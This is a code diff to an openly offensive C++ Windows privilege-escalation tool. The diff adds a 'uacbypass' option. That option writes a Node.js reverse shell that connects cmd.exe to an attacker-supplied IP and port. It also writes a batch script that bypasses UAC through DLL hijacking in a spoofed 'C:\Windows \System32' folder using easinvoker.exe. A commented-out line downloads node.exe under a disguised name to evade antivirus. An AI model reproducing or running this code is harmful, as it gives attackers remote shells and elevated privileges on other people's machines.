@@ -1,5 +1,6 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include <iostream>
+#include <fstream>
 #include <Windows.h>
 #include <string>
 #include <lmcons.h>
@@ -729,21 +730,86 @@ int DupProcessToken(DWORD pid)
 
 }
 
+void uacbypass()
+{
+    DWORD procintegrity=CheckProcessIntegrity(GetCurrentProcessId());
+    if (procintegrity != 0x3000)
+    {
+        printf("current process is NOT elevated...time to work some magic!\n");
+    }
+    else
+    {
+        printf("already elevated!\n");
+        exit(0);
+    }
+    
+    printf("Downloading node.exe portable binary to use for reverse shell and to help stay under the radar from AV (takes ~2 min to download);)\n");
+    //WinExec("powershell Invoke-WebRequest -Uri \"https://nodejs.org/download/release/latest/win-x64/node.exe\" -OutFile \"c:\\users\\public\\n0de.exe\"", 0); //download directly from nodejs file repo
+    
+    
+    cout << "generating rev shell payload now...\n";
+    string revip, portnum;
+    cout << "enter the ip for your attacker box for the rev3rse sh3ll:\n";
+    cin >> revip;
+    cout << "enter the port number for the rev3rse sh3ll:\n";
+    cin >> portnum;
 
+    ofstream mypayload;
+    mypayload.open("c:\\users\\public\\elevationstation.js");
+    mypayload << "(function(){\n";
+    mypayload << "var net = require(\"net\"),\n";
+    mypayload << "cp = require(\"child_process\"),\n";
+    mypayload << "sh = cp.spawn(\"cmd.exe\", []);\n";
+    mypayload << "var client = new net.Socket();\n";
+    mypayload << "client.connect(";
+    mypayload << portnum << ", " << "\"" << revip << "\", function(){\n";
+    mypayload << "client.pipe(sh.stdin);\n";
+    mypayload << "sh.stdout.pipe(client);\n";
+    mypayload << "sh.stderr.pipe(client);\n";
+    mypayload << "});\n";
+    mypayload << "return /a/;\n";
+    mypayload << "})();\n";
+    mypayload.close();
+    cout << ".js rev shell payload created! It's located at: C:\\users\\public\\elevationstation.js\n";
+
+    cout << "now, we need to generate the uac bypass script...\n";
+    ofstream uacbyppayload;
+    uacbyppayload.open("c:\\users\\public\\elevateit.bat");
+    uacbyppayload << "@echo off\n";
+    uacbyppayload << "mkdir \"\\\\?\\C:\\Windows \"\n";
+    uacbyppayload << "mkdir \"\\\\?\\C:\\Windows \\System32\"\n";
+    uacbyppayload << "copy \"c:\\windows\\system32\\easinvoker.exe\" \"C:\\Windows \\System32\\\"\n";
+    uacbyppayload << "cd c:\\temp\n";
+    uacbyppayload << "copy \"netutils.dll\" \"C:\\Windows \\System32\\\"\n";
+    uacbyppayload << "\"C:\\Windows \\System32\\easinvoker.exe\"\n";
+    uacbyppayload << "del /q \"C:\\Windows \\System32\\*\"\n";
+    uacbyppayload << "rmdir \"C:\\Windows \\System32\\\"\n";
+    uacbyppayload << "rmdir \"C:\\Windows \\\"\n";
+    uacbyppayload.close();
+    cout << "uac byp@ss script created! It's located at: C:\\users\\public\\elevateit.bat\n";
+
+
+}
+
+//-WindowStyle hidden 
+void commandlist()
+{
+    printf("Options:\n -p 'process id'\n -cpi 'check process integrity'\n -d 'Technique: duplicate process token (spawns separate shell)'\n -dt 'Technique: duplicate process thread impersonation token and convert to primary token (spawns shell within current console!)'\n -np 'named pipe impersonation method'\n -uac 'uac bypass and elevate standard user (must be member of admin group)'\n -lcp '(!!!Experimental!!!) lower current process integrity by 1 (spawns shellz)'\n -l '(!!!Experimental!!!) lower another program's process integrity by 1 (spawns shellz)'\n");
+    printf("usage: elevationstation.exe -p 1234 -cpi\n");
+    printf("usage: elevationstation.exe -p 1234 -d\n");
+    printf("usage: elevationstation.exe -p 1234 -dt\n");
+    printf("usage: elevationstation.exe -np\n");
+    printf("usage: elevationstation.exe -uac\n");
+    printf("usage: elevationstation.exe -lcp\n");
+    printf("usage: elevationstation.exe -p 1234 -l\n");
+}
 int main(int argc, char* argv[])
 {
     //printf("argc: %d", argc);
     DWORD pid;
-    if (argc == 1 || argc < 4 && strcmp(argv[1], "-lcp") != 0 && strcmp(argv[1], "-np") != 0)
+    if (argc == 1 || argc < 4 && strcmp(argv[1], "-lcp") != 0 && strcmp(argv[1], "-np") != 0 && strcmp(argv[1], "-uac") != 0 && strcmp(argv[1], "-h") != 0)
     {
-        printf("Options:\n -p 'process id'\n -cpi 'check process integrity'\n -d 'Technique: duplicate process token (spawns separate shell)'\n -dt 'Technique: duplicate process thread impersonation token and convert to primary token (spawns shell within current console!)'\n -np 'named pipe impersonation method'\n -lcp '(!!!Experimental!!!) lower current process integrity by 1 (spawns shellz)'\n -l '(!!!Experimental!!!) lower another program's process integrity by 1 (spawns shellz)'\n");
-        printf("usage: elevationstation.exe -p 1234 -cpi\n");
-        printf("usage: elevationstation.exe -p 1234 -d\n");
-        printf("usage: elevationstation.exe -p 1234 -dt\n");
-        printf("usage: elevationstation.exe -np\n");
-        printf("usage: elevationstation.exe -lcp\n");
-        printf("usage: elevationstation.exe -p 1234 -l\n");
-
+        printf("elevationstation.exe -h [lists all commands]\n");
         exit(0);
     }
     /*
@@ -763,6 +829,16 @@ int main(int argc, char* argv[])
             exit(0);
         }
 
+    }
+    if (strcmp(argv[1], "-h") == 0)
+    {
+        commandlist();
+        exit(0);
+    }
+    if (strcmp(argv[1], "-uac") == 0)
+    {
+        uacbypass();
+        exit(0);
     }
     if (strcmp(argv[1], "-lcp") == 0)
     {
